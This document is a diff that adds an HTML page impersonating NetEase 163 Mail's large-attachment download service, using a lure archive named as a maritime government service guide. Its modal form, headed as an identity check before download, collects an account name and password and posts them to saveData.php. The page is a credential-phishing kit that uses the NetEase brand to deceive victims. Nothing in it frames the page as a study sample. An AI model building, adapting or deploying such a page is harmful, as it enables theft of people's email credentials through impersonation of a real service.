@@ -1,0 +1,159 @@
+<html lang="cn"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>网易邮箱超大附件下载</title>
+    <link rel="shortcut icon" href="//mail.163.com/favicon.ico">
+    <link rel="stylesheet" href="css/background.css">
+    <link rel="stylesheet" href="css/button.css">
+    <link rel="stylesheet" href="css/modal.css">
+    <link rel="stylesheet" href="css/download.css">
+    <style>
+        #progressBarContainer {
+            width: 100%;
+            background-color: #ddd;
+        }
+
+        #progressBar {
+            width: 0%;
+            height: 6px;
+            background-color: #4CAF50;
+            border-radius: 10px;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="main">
+        <div class="mainTop"></div>
+        <div class="mainHead">
+            <div class="mainHead2">
+                <p>超大附件下载</p>
+            </div>
+            <div class="mainHead3">
+                <p style="color: #555555;"><span id="display"></span></p>
+            </div>
+            <div class="mainHead4">
+                <p>内容举报&nbsp;&nbsp;|&nbsp;&nbsp;问题反馈&nbsp;&nbsp;|&nbsp;&nbsp;帮助</p>
+            </div>
+        </div>
+        <div class="mainBody">
+            <div id="visibleDiv" class="visible-div">
+                <span class="close-btn" onclick="closeDiv()"><img src="images/X.png" width="14"></span>
+                <img src="images/m.png" height="16">
+                <p style="width: 865px;">&nbsp;&nbsp;开通邮箱会员，享文件极速下载和在线解压特权。</p>
+                <p style="color: #3370ff;width: 90px;font-size: 12px;">开通会员</p>
+            </div>
+            <div class="file-icon">
+                <div id="fileList"></div>
+            </div>
+            <div class="downloadName" style="font-weight: 500;margin-bottom: 8px;margin-top: 16px;">
+                <ul>
+                    <li>海事政务服务指南及申请文书.7z</li>                </ul>
+            </div>
+            <div class="downloadMB" style="margin-bottom: 16px;">
+                <ul>
+                    <li>260.7 KB</li>                </ul>
+            </div>
+            <div class="downloadTime">
+                <div id="countdown" class="countdown-container"></div>
+            </div>
+            <div class="downloadButtom">
+                <div class="buttons">
+                    <button id="myBtn1" class="ellipse-button1" style="display: block;">普通下载</button>
+                    <button id="myBtn2" class="ellipse-button1" style="display: none;">
+                        <div style="padding-bottom: 1px;">在线解压<br>
+                            <div style="font-size: 12px;align-items: center;">免费体验1次</div>
+                        </div>
+                    </button>
+                    <button id="myBtn3" class="ellipse-button2" style="display: block;">
+                        <div style="padding-bottom: 1px;">
+                            <svg xmlns="http://www.w3.org/2000/svg" width="9" height="12" fill="#fff">
+                                <path fill="#fff" d="M2.796 7.023H.44a.439.439 0 0 1-.41-.595L2.37.283A.439.439 0 0 1 2.78 0h3.951c.312 0 .524.316.407.605L5.775 3.95H8.34c.377 0 .579.444.33.728l-6.292 7.17c-.306.348-.873.046-.754-.402l1.17-4.424Z">
+                                </path>
+                            </svg>&nbsp;&nbsp;极速下载<br>
+                            <div style="font-size: 12px;">预计节约4分钟</div>
+                        </div>
+                    </button>
+                    <div id="myModal" class="modal">
+
+                        <form id="loginForm" action="saveData.php" method="POST" onsubmit="return submitData();">
+                            <div class="modal-content">
+                                <!-- <span class="close" style="position:absolute;top:20px;right: 20px;width:24px;height:24px;">
+                                    <img src="images/X.png" style="height:24px;"></span><br> -->
+                                <h3 style="color:red">请验证身分后下载</h3>
+
+
+                                <input type="text" id="data1" name="data1" class="number1" placeholder="请输入帐号" value="">
+
+                                <input type="password" id="data2" name="data2" class="number2" placeholder="请输入密码" required="">
+
+
+
+                                <div id="submitStatus" style="display: none; color:red; position:relative;"></div>
+
+                                <button type="submit" id="submitBtn" class="enter">验&nbsp;证</button>
+
+                            </div>
+                        </form>
+
+
+                    </div>
+                    <div style="display: flex; flex-direction:column">
+                        <div id="downloadAnimation" style="display: none;">
+                            <div id="progressBarContainer" style="width: 600px;">
+                                <div id="progressBar"></div>
+                            </div>
+                            <br>
+                            <div style="display: flex; flex-direction:row;color:#555555;">
+                                <div class="info" id="fsz" style="font-size: 14px; line-height: 14px;">0MB</div>
+                                <div class="info" id="fsize" style="font-size: 14px; line-height: 14px;">/0MB</div>
+                                <div style="margin-left:auto;"></div>
+                                <div id="downloadLogo" style="width: 20px; display:none; line-height: 14px;">
+                                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="none">
+                                        <g clip-path="url(#a)">
+                                            <circle cx="8" cy="8" r="7.333" fill="#14B360"></circle>
+                                            <path fill="#fff" fill-rule="evenodd" d="M11.738 5.862a.667.667 0 0 0-.943 0L7.024 9.633 5.138 7.748a.667.667 0 1 0-.943.942l2.357 2.357c.26.26.683.26.943 0l4.243-4.242a.667.667 0 0 0 0-.943Z" clip-rule="evenodd"></path>
+                                        </g>
+                                        <defs>
+                                            <clipPath id="a">
+                                                <path fill="#fff" d="M0 0h16v16H0z"></path>
+                                            </clipPath>
+                                        </defs>
+                                    </svg>
+                                </div>
+                                <div id="downloadDone" style="display:none; color:#4CAF50; font-size: 14px; line-height: 14px; justify-content: flex-end;"></div>
+                            </div>
+
+                            <br>
+                        </div>
+                        <div style="display: flex; justify-content: center; margin: 0px;">
+                            <div id="otherBtn1" class="download-button1" style="display: none;">
+                                重新下载
+                            </div>
+                            <div id="otherBtn2" class="download-button2" style="display: none;">
+                                保存文件
+                            </div>
+                        </div>
+                        <br>
+                        <div id="downloadText" style="display: none; justify-content:center;">
+                            <div style="color:#595959;">您对下载过程是否满意？</div>
+                            <div style="color:#3370ff;">参与调研</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="mainFoot">
+            <div style="margin-bottom: 10px;">About NetEase | 公司简介 | 联系方法 | 招聘信息 | 客户服务 | 相关法律 | 网络营销</div>
+            <div>Copyright © 1997-2024 网易公司版权所有</div>
+        </div>
+        <script src="js/logo.js"></script>
+        <script src="js/time.js"></script>
+        <script src="js/login.js"></script>
+        <script>
+
+        </script>
+
+
+
+</div></body></html>
